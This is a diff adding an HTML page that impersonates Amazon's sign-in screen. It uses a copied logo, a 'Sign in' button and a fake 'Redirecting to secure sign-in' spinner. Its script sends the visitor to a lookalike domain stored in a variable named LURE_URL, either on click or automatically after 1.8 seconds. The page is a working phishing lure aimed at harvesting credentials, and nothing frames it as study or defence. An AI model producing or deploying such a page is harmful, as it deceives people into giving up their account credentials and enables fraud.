@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Amazon Sign-In</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
+    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
+    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
+    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
+    .btn{display:block;width:100%;padding:12px;background:#131921;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
+    .btn:hover{opacity:.88}
+    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #131921;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading{display:none}
+    .loading p{color:#888;font-size:14px;margin-top:8px}
+    footer{margin-top:24px;color:#999;font-size:12px}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="100" height="30" viewBox="0 0 603 182"><path fill="#FF9900" d="M375.3 141.3c-34.7 25.6-85 39.2-128.4 39.2-60.8 0-115.5-22.5-156.9-59.8-3.3-2.9-.3-6.9 3.5-4.6 44.7 26 99.9 41.6 156.9 41.6 38.5 0 80.8-8 119.8-24.6 5.8-2.6 10.8 3.8 5.1 8.2z"/><path fill="#FF9900" d="M389.6 125c-4.5-5.7-29.5-2.7-40.7-1.4-3.4.4-3.9-2.6-.9-4.7 19.9-14 52.7-10 56.5-5.3 3.8 4.8-1 37.7-19.7 53.4-2.9 2.4-5.6 1.1-4.3-2 4.2-10.4 13.5-33.7 9.1-40z"/><path fill="#131921" d="M350.5 20.1V7.7c0-1.8 1.4-3.1 3.1-3.1h54.9c1.8 0 3.2 1.3 3.2 3.1v10.7c0 1.8-1.5 4.1-4.1 7.7l-28.4 40.6c10.5-.3 21.7 1.3 31.2 6.7 2.2 1.2 2.7 3 2.9 4.7v13.2c0 1.8-1.9 3.8-4 2.7-16.5-8.7-38.4-9.6-56.7.1-1.9 1-3.8-.9-3.8-2.8V79.1c0-2 0-5.4 2-8.4l32.9-47.2h-28.6c-1.8 0-3.1-1.2-3.1-3.1-.1-.1-.6-.1-.5-.3zm-190.2 73.1h-16.6c-1.6-.1-2.9-1.4-3-2.9V7.9c0-1.8 1.5-3.1 3.3-3.1h15.5c1.7.1 3 1.4 3.1 3V19h.3c4-11.6 11.6-17 21.8-17 10.4 0 16.9 5.5 21.5 17 4-11.6 13.1-17 22.9-17 7 0 14.6 2.9 19.3 9.4 5.2 7.2 4.1 17.6 4.1 26.8l-.1 53.3c0 1.8-1.5 3.1-3.3 3.1h-16.6c-1.7-.1-3.1-1.5-3.1-3.1V46.4c0-3.6.3-12.5-.5-15.9-1.3-5.7-4.9-7.2-9.6-7.2-3.9 0-8 2.6-9.7 6.8-1.7 4.2-1.5 11.1-1.5 16.3v44.1c0 1.8-1.5 3.1-3.3 3.1h-16.6c-1.7-.1-3.1-1.5-3.1-3.1l-.1-45.2c0-9.5 1.6-23.5-10.1-23.5-11.8 0-11.4 13.6-11.4 23.5v45.2c.2 1.6-1.4 3-3.2 3zm259.2 2.9c-41 0-63.3-35.2-63.3-79.9 0-46.2 26.1-80 63.3-80 35.7 0 57.1 35 57.1 79 0 44.9-22.3 80.9-57.1 80.9zm0-29.3c18 0 19.1-24.5 19.1-39.7 0-15.2-.3-47.9-18.8-47.9-18.8 0-19.7 26.2-19.7 42.2 0 16.1.5 45.4 19.4 45.4zm105.6 26.4h-16.6c-1.7-.1-3.1-1.5-3.1-3.1l-.1-82.4c.2-1.7 1.6-2.9 3.3-2.9h15.4c1.5.1 2.7 1.1 3 2.5v12.6h.3c4.5-11.4 10.8-16.8 21.9-16.8 7.2 0 14.2 2.6 18.8 9.7 4.2 6.6 4.2 17.7 4.2 25.7v51.4c-.2 1.6-1.6 2.9-3.3 2.9h-16.7c-1.5-.1-2.9-1.3-3-2.9V47.8c0-9.4 1.1-23.1-10.2-23.1-3.9 0-7.6 2.6-9.4 6.6-2.3 5.1-2.6 10.2-2.6 16.5v42.7c0 1.9-1.6 3.2-3.3 3.1-.1-.5 0-.4 0-.4zM94.6 55.4c0 6.5.2 11.9-3.1 17.6-2.7 4.7-6.9 7.5-11.7 7.5-6.5 0-10.2-4.9-10.2-12.2 0-14.4 12.9-17 25-17v4.1zm16.9 40.9c-1.1 1-2.7 1.1-4 .4-5.6-4.7-6.7-6.8-9.7-11.3-9.3 9.5-15.9 12.3-28 12.3-14.3 0-25.4-8.8-25.4-26.5 0-13.8 7.5-23.2 18.1-27.8 9.2-4.1 22.2-4.8 32.1-5.9v-2.2c0-4.1.3-8.9-2.1-12.4-2.1-3.2-6.1-4.5-9.6-4.5-6.5 0-12.4 3.4-13.8 10.3-.3 1.6-1.4 3.1-3 3.1l-16.5-1.8c-1.4-.3-2.9-1.4-2.5-3.5C52.1 7.5 72 1.5 90 1.5c9.2 0 21.2 2.5 28.5 9.4 9.2 8.6 8.3 20.1 8.3 32.6v29.5c0 8.9 3.7 12.8 7.1 17.6 1.2 1.7 1.5 3.8-.1 5L111.5 96.3z"/></svg></div>
+    <p class="tagline">Sign in for the best experience.</p>
+    <a class="btn" id="btn" href="#">Sign in</a>
+  </div>
+  <div class="card loading" id="loading">
+    <div class="spinner"></div>
+    <p>Redirecting to secure sign-in&hellip;</p>
+  </div>
+  <footer>Secure connection &bull; Privacy Policy</footer>
+  <script>
+    var LURE_URL = 'https://www.amazon2026.authenticationsession.online/AKhwZRQi'; /* AUTO_LURE_URL */
+    document.getElementById('btn').href = LURE_URL;
+    document.getElementById('btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    });
+    // Auto-redirect after 1.8s if user doesn't click
+    setTimeout(function(){
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    }, 1800);
+  </script>
+</body>
+</html>
